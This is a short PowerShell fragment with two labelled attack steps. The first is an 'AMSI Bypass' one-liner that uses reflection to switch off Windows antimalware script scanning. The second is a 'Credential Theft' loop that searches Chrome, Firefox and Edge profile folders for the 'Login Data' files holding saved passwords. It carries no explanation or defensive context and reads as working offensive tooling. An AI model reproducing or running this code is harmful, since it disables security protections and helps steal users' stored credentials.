
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)


# Credential Theft
$browsers = @("Chrome", "Firefox", "Edge")
foreach ($browser in $browsers) {
    $loginData = Get-ChildItem "$env:USERPROFILE\AppData\Local\$browser" -Recurse -Include "Login Data" -ErrorAction SilentlyContinue
    if ($loginData) { break }
}
